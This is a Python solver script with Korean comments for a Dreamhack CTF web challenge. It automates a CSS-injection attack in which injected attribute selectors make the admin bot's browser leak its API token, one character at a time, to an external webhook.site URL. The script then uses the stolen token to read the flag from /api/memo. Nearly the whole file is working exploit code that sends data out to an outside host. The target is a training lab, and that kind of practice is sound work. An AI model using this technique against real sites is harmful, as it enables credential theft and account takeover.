#!/usr/bin/env python3
"""
CSS Injection을 이용한 Admin Token 탈취 및 FLAG 획득 자동화 스크립트
개선 버전: 모든 문자를 한 번에 테스트
"""
import requests
import string
import time

# ===== 설정 =====
TARGET_URL = "http://host8.dreamhack.games:16955"
WEBHOOK_URL = "https://webhook.site/aecbec68-5b93-4302-9128-10540f3f57f5"

# ===== 1단계: CSS Injection으로 Admin Token 탈취 =====
def send_all_payloads():
    """
    모든 가능한 문자 조합에 대해 CSS Injection 페이로드를 한 번에 전송
    """
    print("[*] Starting Mass CSS Injection Attack...")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Webhook: {WEBHOOK_URL}")
    print("\n[!] This will send multiple requests. Please wait...")
    
    charset = string.ascii_lowercase
    token = ""
    
    # 토큰 길이는 8자리
    for position in range(8):
        print(f"\n{'='*60}")
        print(f"[*] Extracting position {position + 1}/8")
        print(f"[*] Current progress: '{token}'")
        print(f"{'='*60}")
        
        print(f"\n[*] Sending {len(charset)} payloads for position {position + 1}...")
        
        # 각 문자에 대해 페이로드 전송
        for i, char in enumerate(charset, 1):
            test_token = token + char
            
            # CSS Injection 페이로드
            css_payload = (
                f"white;}} "
                f"input[id=InputApitoken][value^={test_token}] {{"
                f"background: url({WEBHOOK_URL}/{test_token});"
                f"}}"
            )
            
            report_data = {
                "path": f"mypage?color={css_payload}"
            }
            
            try:
                response = requests.post(
                    f"{TARGET_URL}/report",
                    data=report_data,
                    timeout=10
                )
                
                status = "✓" if "success" in response.text else "✗"
                print(f"  [{i:2d}/{len(charset)}] '{char}' -> {test_token}: {status}", end="\r")
                
                # Rate limiting 방지 (너무 빠르면 서버가 막을 수 있음)
                time.sleep(0.3)
                
            except Exception as e:
                print(f"\n  [!] Error sending '{char}': {e}")
                continue
        
        print(f"\n\n[✓] All {len(charset)} payloads sent for position {position + 1}!")
        print("\n[!] Now check your webhook URL:")
        print(f"    {WEBHOOK_URL}")
        print("\n[!] Look for incoming requests and find the token that appears")
        print("    Example: If you see '/abcdefgh' in the webhook, the character is the last one")
        
        if position == 0:
            print("\n[TIP] For position 1, you'll see single character like '/a', '/b', etc.")
        else:
            print(f"\n[TIP] For position {position + 1}, look for '{token}' + one more character")
        
        # 사용자로부터 발견한 문자 입력받기
        while True:
            found_char = input(f"\n[?] Enter the character found at position {position + 1} (or 'quit' to exit): ").strip().lower()
            
            if found_char == 'quit':
                print("\n[!] Exiting...")
                return None
            
            if len(found_char) == 1 and found_char in charset:
                token += found_char
                print(f"\n[✓] Character accepted: '{found_char}'")
                print(f"[✓] Current token: '{token}'")
                break
            else:
                print(f"[!] Invalid input. Please enter a single lowercase letter (a-z)")
    
    print(f"\n{'='*60}")
    print(f"[✓✓✓] Complete token extracted: {token}")
    print(f"{'='*60}")
    return token


# ===== 2단계: 추출한 Token으로 FLAG 획득 =====
def get_flag_with_token(token):
    """
    Admin의 API token을 사용하여 /api/memo에서 FLAG 획득
    """
    print(f"\n[*] Attempting to retrieve FLAG with token: {token}")
    
    headers = {
        "API-KEY": token
    }
    
    try:
        response = requests.get(
            f"{TARGET_URL}/api/memo",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 200:
                print("[✓] Successfully accessed admin memo!")
                memos = data.get('memo', [])
                
                print(f"\n{'='*60}")
                print("MEMO CONTENTS:")
                print(f"{'='*60}")
                
                flag_found = False
                for memo in memos:
                    print(f"\n[Memo {memo['idx']}]")
                    print(memo['memo'])
                    
                    # FLAG 찾기
                    if 'FLAG' in memo['memo'] or 'DH{' in memo['memo']:
                        flag_found = True
                
                if flag_found:
                    print(f"\n{'='*60}")
                    print("[✓✓✓] FLAG FOUND ABOVE!")
                    print(f"{'='*60}")
                else:
                    print(f"\n[!] No FLAG found in memos")
                
                return True
            else:
                print(f"[!] API Error: {data.get('message')}")
                return False
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            print(f"[!] Response: {response.text}")
            return False
            
    except Exception as e:
        print(f"[!] Exception: {e}")
        return False


# ===== 수동 모드: 이미 token을 알고 있는 경우 =====
def manual_mode():
    """
    이미 admin token을 알고 있는 경우 직접 입력하여 FLAG 획득
    """
    print("\n[*] Manual Mode - Enter known admin token")
    token = input("[?] Enter admin token (8 lowercase letters): ").strip()
    
    if len(token) == 8 and token.islower() and token.isalpha():
        get_flag_with_token(token)
    else:
        print("[!] Invalid token format (should be 8 lowercase letters)")


# ===== 빠른 테스트 모드 =====
def quick_test():
    """
    한 위치만 테스트해보기 (동작 확인용)
    """
    print("\n[*] Quick Test Mode - Testing first character only")
    print("[*] This will help you verify the exploit is working")
    
    charset = string.ascii_lowercase[:5]  # a, b, c, d, e만 테스트
    
    print(f"\n[*] Sending {len(charset)} test payloads...")
    
    for char in charset:
        css_payload = (
            f"white;}} "
            f"input[id=InputApitoken][value^={char}] {{"
            f"background: url({WEBHOOK_URL}/TEST_{char});"
            f"}}"
        )
        
        report_data = {
            "path": f"mypage?color={css_payload}"
        }
        
        try:
            response = requests.post(
                f"{TARGET_URL}/report",
                data=report_data,
                timeout=10
            )
            print(f"  [+] Test '{char}': {'✓' if 'success' in response.text else '✗'}")
            time.sleep(0.5)
        except Exception as e:
            print(f"  [!] Error: {e}")
    
    print(f"\n[✓] Test complete! Check webhook for requests with 'TEST_' prefix")
    print(f"    {WEBHOOK_URL}")


# ===== 메인 실행 =====
def main():
    print("="*60)
    print("CSS Injection CTF Challenge Solver")
    print("Improved Version - Mass payload delivery")
    print("="*60)
    
    print(f"\n[✓] Target URL: {TARGET_URL}")
    print(f"[✓] Webhook URL: {WEBHOOK_URL}")
    
    print("\n[?] Select mode:")
    print("1. Full exploit (extract token step by step)")
    print("2. Manual mode (enter known token)")
    print("3. Quick test (verify exploit works)")
    
    choice = input("\nEnter choice (1/2/3): ").strip()
    
    if choice == "1":
        # 전체 exploit
        token = send_all_payloads()
        
        if token and len(token) == 8:
            print("\n[*] Proceeding to FLAG retrieval...")
            get_flag_with_token(token)
        else:
            print("\n[!] Token extraction incomplete or cancelled")
    
    elif choice == "2":
        # 수동 모드
        manual_mode()
    
    elif choice == "3":
        # 빠른 테스트
        quick_test()
    
    else:
        print("[!] Invalid choice")


if __name__ == "__main__":
    main()